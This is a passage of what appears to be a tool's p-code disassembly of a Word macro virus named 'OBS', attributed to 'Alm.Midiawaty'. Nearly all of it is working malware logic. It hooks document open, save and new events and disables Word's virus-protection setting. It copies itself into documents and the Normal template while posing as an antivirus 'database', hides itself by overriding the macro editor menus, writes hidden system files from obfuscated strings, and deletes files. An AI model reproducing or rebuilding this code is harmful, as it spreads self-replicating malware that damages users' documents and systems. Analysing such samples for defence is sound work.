' 	Ld AaA 
' 	Add 
' 	Ld VwX 
' 	Add 
' 	Ld AaA 
' 	Add 
' 	Ld StU 
' 	Add 
' 	Ld HiJ 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld Midi 
' 	Add 
' 	Ld MnO 
' 	Add 
' 	Ld CdE 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld pOn 
' 	Add 
' 	Ld OpQ 
' 	Add 
' 	Ld GhI 
' 	Add 
' 	Ld AaA 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld tSr 
' 	Add 
' 	Ld sRq 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld Midi 
' 	Add 
' 	Ld KlM 
' 	Add 
' 	Ld VwX 
' 	Add 
' 	Ld AaA 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld gFe 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld QrS 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	Ld UvW 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	Ld QrS 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	St sayst 
' Line #85:
' 	Ld WP 
' 	Ld Spb 
' 	Add 
' 	Ld HiJ 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld cbd 
' 	Add 
' 	Ld QrS 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld lkm 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	Ld MnO 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld Sbs 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld QrS 
' 	Add 
' 	Ld QrS 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	St saynd 
' Line #86:
' 	Ld Bbs 
' 	Ld XyZ 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld pOn 
' 	Add 
' 	Ld OpQ 
' 	Add 
' 	Ld GhI 
' 	Add 
' 	Ld AaA 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld tSr 
' 	Add 
' 	Ld sRq 
' 	Add 
' 	St sayrd 
' Line #87:
' 	Ld QrS 
' 	Ld DeF 
' 	Add 
' 	Ld LmN 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	St sayrm 
' Line #88:
' 	Ld DeF 
' 	Ld BcD 
' 	Add 
' 	Ld ihj 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	St sayec 
' Line #89:
' 	Ld oao 
' 	Ld sayec 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld gfh 
' 	Add 
' 	Ld gfh 
' 	Add 
' 	St sayof 
' Line #90:
' 	Ld BcD 
' 	Ld NoP 
' 	Add 
' 	Ld OpQ 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld pOn 
' 	Add 
' 	Ld cBa 
' 	Add 
' 	Ld pOn 
' 	Add 
' 	Ld tSr 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld HiJ 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld pnh 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld MnO 
' 	Add 
' 	Ld TuV 
' 	Add 
' 	Ld mln 
' 	Add 
' 	St saycp 
' Line #91:
' 	Ld BcD 
' 	Ld tt2 
' 	Add 
' 	Ld grm 
' 	Add 
' 	Ld HiJ 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #92:
' 	Ld BcD 
' 	Ld tt2 
' 	Add 
' 	Ld grm 
' 	Add 
' 	Ld pOn 
' 	Add 
' 	Ld cBa 
' 	Add 
' 	Ld pOn 
' 	Add 
' 	Ld tSr 
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayst 
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld saynd 
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayrd 
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #97:
' 	Ld BcD 
' 	Ld tt2 
' 	Add 
' 	Ld grm 
' 	Add 
' 	Ld LmN 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld CdE 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #98:
' 	Ld BcD 
' 	Ld tt2 
' 	Add 
' 	Ld grm 
' 	Add 
' 	Ld LmN 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld CdE 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #99:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld tkm 
' 	Ld sayst 
' 	Add 
' 	PrintItemNL 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld tkm 
' 	Ld saynd 
' 	Add 
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld tkm 
' 	Ld sayrd 
' 	Add 
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #103:
' 	Ld BcD 
' 	Ld tt2 
' 	Add 
' 	Ld grm 
' 	Add 
' 	Ld LmN 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld CdE 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld FAH 
' 	Ld FAR 
' 	Add 
' 	Ld FAS 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' Line #104:
' 	Ld BcD 
' 	Ld tt2 
' 	Add 
' 	Ld grm 
' 	Add 
' 	Ld BcD 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld MnO 
' 	Add 
' 	Ld gfh 
' 	Add 
' 	Ld HiJ 
' 	Add 
' 	Ld hgi 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayrm 
' 	Ld sayst 
' 	Add 
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayrm 
' 	Ld saynd 
' 	Add 
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayrm 
' 	Ld sayrd 
' 	Add 
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #109:
' 	Ld BcD 
' 	Ld tt2 
' 	Add 
' 	Ld grm 
' 	Add 
' 	Ld AaA 
' 	Add 
' 	Ld TuV 
' 	Add 
' 	Ld StU 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	Ld yxz 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	Ld BcD 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld cbd 
' 	Add 
' 	Ld AaA 
' 	Add 
' 	Ld StU 
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayof 
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld BcD 
' 	Ld mln 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayec 
' 	Ld ttk 
' 	Add 
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayec 
' 	Ld Spb 
' 	Add 
' 	Ld sayst 
' 	Add 
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayec 
' 	Ld ttk 
' 	Add 
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayec 
' 	Ld Spb 
' 	Add 
' 	Ld saynd 
' 	Add 
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayec 
' 	Ld ttk 
' 	Add 
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayec 
' 	Ld Spb 
' 	Add 
' 	Ld sayrd 
' 	Add 
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayec 
' 	Ld ttk 
' 	Add 
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayec 
' 	Ld ttk 
' 	Add 
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sayec 
' 	Ld ttk 
' 	Add 
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld saycp 
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Pbs 
' 	Ld AaA 
' 	Add 
' 	Ld TuV 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #124:
' 	ArgsCall Beep 0x0000 
' Line #125:
' 	ArgsCall OphayMD 0x0000 
' Line #126:
' 	LineCont 0x0014 18 00 00 00 2E 00 00 00 44 00 00 00 5B 00 00 00 71 00 00 00
' 	Ld Pbs 
' 	Ld mln 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	Ld AaA 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld AaA 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld hgi 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld CdE 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld cbd 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld StU 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld TuV 
' 	Add 
' 	Ld QrS 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld VwX 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld QrS 
' 	Add 
' 	Ld lkm 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld Asr 
' 	Add 
' 	Ld MnO 
' 	Add 
' 	Ld CdE 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld MnO 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld VwX 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld TuV 
' 	Add 
' 	Ld QrS 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld VwX 
' 	Add 
' 	Ld HiJ 
' 	Add 
' 	Ld MnO 
' 	Add 
' 	Ld CdE 
' 	Add 
' 	Ld NoP 
' 	Add 
' 	Ld VwX 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld HiJ 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld Spb 
' 	Add 
' 	Ld Dbs 
' 	Add 
' 	Ld Ebs 
' 	Add 
' 	Ld Asr 
' 	Add 
' 	Ld Dbs 
' 	Add 
' 	St Gone 
' Line #127:
' 	LitStr 0x0016 "I'm Ophay Sweet Razta."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x002B "Under Licensy form Ophay Bussines Solution."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Gone 
' 	Add 
' 	LitStr 0x001E " . . . !!!  See you next time."
' 	Add 
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "Hello..."
' 	ArgsCall MsgBox 0x0003 
' Line #128:
' 	Ld WP 
' 	Ld grm 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld StU 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	Ld LmN 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld CdE 
' 	Add 
' 	Ld AaA 
' 	Add 
' 	Ld StU 
' 	Add 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #129:
' 	Ld WP 
' 	Ld grm 
' 	Add 
' 	Ld TuV 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	Ld QrS 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld CdE 
' 	Add 
' 	Ld AaA 
' 	Add 
' 	Ld StU 
' 	Add 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #130:
' 	Ld WP 
' 	Ld grm 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld StU 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	Ld LmN 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld HiJ 
' 	Add 
' 	Ld MnO 
' 	Add 
' 	Ld HiJ 
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #131:
' 	Ld WP 
' 	Ld grm 
' 	Add 
' 	Ld VwX 
' 	Add 
' 	Ld HiJ 
' 	Add 
' 	Ld MnO 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld HiJ 
' 	Add 
' 	Ld MnO 
' 	Add 
' 	Ld HiJ 
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #132:
' 	Ld WP 
' 	Ld grm 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld XyZ 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld StU 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	Ld LmN 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld CdE 
' 	Add 
' 	Ld AaA 
' 	Add 
' 	Ld StU 
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #133:
' 	Ld WP 
' 	Ld grm 
' 	Add 
' 	Ld TuV 
' 	Add 
' 	Ld RsT 
' 	Add 
' 	Ld DeF 
' 	Add 
' 	Ld QrS 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld CdE 
' 	Add 
' 	Ld AaA 
' 	Add 
' 	Ld StU 
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #134:
' 	LitStr 0x0042 "Be carefull ....God Knows ... Your Computer is Dead ... Thank's MD"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #135:
' 	EndSub 
' Line #136:
' 	FuncDefn (Sub AutoExec())
' Line #137:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #138:
' 	ArgsCall OBS 0x0000 
' Line #139:
' 	ArgsCall FileNewdefault 0x0000 
' Line #140:
' 	ArgsCall AttactTemp 0x0000 
' Line #141:
' 	ArgsCall MDBirth 0x0000 
' Line #142:
' 	EndSub 
' Line #143:
' 	FuncDefn (Sub OBS())
' Line #144:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #145:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #146:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #147:
' 	ArgsCall OphayReg 0x0000 
' Line #148:
' 	EndSub 
' Line #149:
' 	FuncDefn (Sub ToolsOptions())
' Line #150:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #151:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #152:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #153:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #154:
' 	ArgsCall OBS 0x0000 
' Line #155:
' 	EndSub 
' Line #156:
' 	FuncDefn (Sub ToolsMacro())
' Line #157:
' 	ArgsCall FGe 0x0000 
' Line #158:
' 	ArgsCall Beep 0x0000 
' Line #159:
' 	ArgsCall CapNormal 0x0000 
' Line #160:
' 	LineCont 0x000C 08 00 0A 00 0F 00 0A 00 16 00 0A 00
' 	LitStr 0x0020 "              Alm.Midiawaty ,SE."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0022 "Alm.Midiawaty trying to remain you"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002D "To Build The World a Better Place for Living."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "Don't Touch Me!!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0015 "Don't try it again!!!"
' 	Add 
' 	Concat 
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0003 "OBS"
' 	ArgsCall MsgBox 0x0003 
' Line #161:
' 	EndSub 
' Line #162:
' 	FuncDefn (Sub ViewVbCode())
' Line #163:
' 	ArgsCall ToolsMacro 0x0000 
' Line #164:
' 	EndSub 
' Line #165:
' 	FuncDefn (Sub FileTemplates())
' Line #166:
' 	ArgsCall ToolsMacro 0x0000 
' Line #167:
' 	EndSub 
' Line #168:
' 	FuncDefn (Sub OphayMD())
' Line #169:
' 	OnError (Resume Next) 
' Line #170:
' 	LitStr 0x001B "You Have Been Forgetting me"
' 	Ld Application 
' 	MemSt Caption 
' Line #171:
' 	LitStr 0x0030 "Alm.Midiawaty ,SE Is Always Everywhere Actualy. "
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #172:
' 	LitStr 0x0036 "I Love OphaySR and don't hurt him or I'll Kill You... "
' 	Ld Application 
' 	MemSt StatusBar 
' Line #173:
' 	EndSub 
' Line #174:
' 	FuncDefn (Sub FGe())
' Line #175:
' 	LitStr 0x000C "Don't Forget"
' 	Ld Application 
' 	MemSt Caption 
' Line #176:
' 	LitStr 0x0027 "You try to remove Virus ScanMacro OBS. "
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #177:
' 	LitStr 0x0032 "Alm.Midiawaty trying to remain you, Please Wait..."
' 	Ld Application 
' 	MemSt StatusBar 
' Line #178:
' 	ArgsCall Wait 0x0000 
' Line #179:
' 	EndSub 
' Line #180:
' 	FuncDefn (Sub CapNormal())
' Line #181:
' 	OnError (Resume Next) 
' Line #182:
' 	LitStr 0x000E "Microsoft Word"
' 	Ld Application 
' 	MemSt Caption 
' Line #183:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #184:
' 	EndSub 
' Line #185:
' 	FuncDefn (Sub FileOpen())
' Line #186:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #187:
' 	OnError (Resume Next) 
' Line #188:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #189:
' 	ArgsCall AttactDoc 0x0000 
' Line #190:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #191:
' 	ArgsCall MDBirth 0x0000 
' Line #192:
' 	ArgsCall MiDiDay 0x0000 
' Line #193:
' 	ArgsCall CapNormal 0x0000 
' Line #194:
' 	EndIfBlock 
' Line #195:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #196:
' 	ArgsCall AttactDoc 0x0000 
' Line #197:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #198:
' 	ArgsCall MDBirth 0x0000 
' Line #199:
' 	ArgsCall MiDiDay 0x0000 
' Line #200:
' 	EndSub 
' Line #201:
' 	FuncDefn (Sub AutoOpen())
' Line #202:
' 	ArgsCall OBS 0x0000 
' Line #203:
' 	ArgsCall AttactDoc 0x0000 
' Line #204:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #205:
' 	ArgsCall AttactTemp 0x0000 
' Line #206:
' 	OnError (Resume Next) 
' Line #207:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #208:
' 	ArgsCall MDBirth 0x0000 
' Line #209:
' 	ArgsCall MiDiDay 0x0000 
' Line #210:
' 	ArgsCall CapNormal 0x0000 
' Line #211:
' 	EndSub 
' Line #212:
' 	FuncDefn (Sub FileSave())
' Line #213:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #214:
' 	ArgsCall AttactDoc 0x0000 
' Line #215:
' 	ArgsCall AttactTemp 0x0000 
' Line #216:
' 	OnError (Resume Next) 
' Line #217:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #218:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #219:
' 	EndIfBlock 
' Line #220:
' 	EndSub 
' Line #221:
' 	FuncDefn (Sub FileNew())
' Line #222:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #223:
' 	ArgsCall AttactDoc 0x0000 
' Line #224:
' 	EndSub 
' Line #225:
' 	FuncDefn (Sub FileNewdefault())
' Line #226:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #227:
' 	ArgsCall AttactDoc 0x0000 
' Line #228:
' 	EndSub 
' Line #229:
' 	FuncDefn (Sub Wait())
' Line #230:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x01F4 
' 	For 
' Line #231:
' 	OnError (Resume Next) 
' Line #232:
' 	ArgsCall Beep 0x0000 
' Line #233:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #234:
' 	EndSub 
' Line #235:
' 	FuncDefn (Sub AttactDoc())
' Line #236:
' 	Dim 
' 	VarDefn DYes (As Boolean)
' Line #237:
' 	LitVarSpecial (False)
' 	St DYes 
' Line #238:
' 	OnError Dock 
' Line #239:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #240:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0008 "OBSv2904"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DYes 
' 	EndIf 
' Line #241:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0003 "OBS"
' 	Eq 
' 	IfBlock 
' Line #242:
' 	LitStr 0x002E "Upgrading Database Ophay Bussines Solution to "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0018 " for virus protection..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #243:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Obj 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #244:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "OBSv2904"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #245:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0008 "OBSv2904"
' 	Ne 
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #246:
' 	LitStr 0x0003 "OBS"
' 	Ld Application 
' 	MemSt Caption 
' Line #247:
' 	LitStr 0x000C "Found Virus "
' 	Ld Obj 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0004 " in "
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0003 "..."
' 	Add 
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #248:
' 	LitStr 0x0038 "Ophay Bussines Solution will automaticly removing Virus "
' 	Ld Obj 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0004 " in "
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0003 "..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #249:
' 	ArgsCall Wait 0x0000 
' Line #250:
' 	ArgsCall CapNormal 0x0000 
' Line #251:
' 	LitStr 0x000F "Removing Virus "
' 	Ld Obj 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0004 " in "
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0012 "...Please Wait !!!"
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #252:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Obj 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #253:
' 	LitStr 0x0006 "Virus "
' 	Ld Obj 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0004 " in "
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x000D " was removed."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #254:
' 	EndIfBlock 
' Line #255:
' 	EndIfBlock 
' Line #256:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	NextVar 
' Line #257:
' 	Ld DYes 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #258:
' 	LitStr 0x002D "Creating Database Ophay Bussines Solution to "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0018 " for virus protection..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #259:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "OBSv2904"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #260:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #261:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #262:
' 	EndIfBlock 
' Line #263:
' 	Label Dock 
' Line #264:
' 	EndSub 
' Line #265:
' 	FuncDefn (Sub AttactTemp())
' Line #266:
' 	Dim 
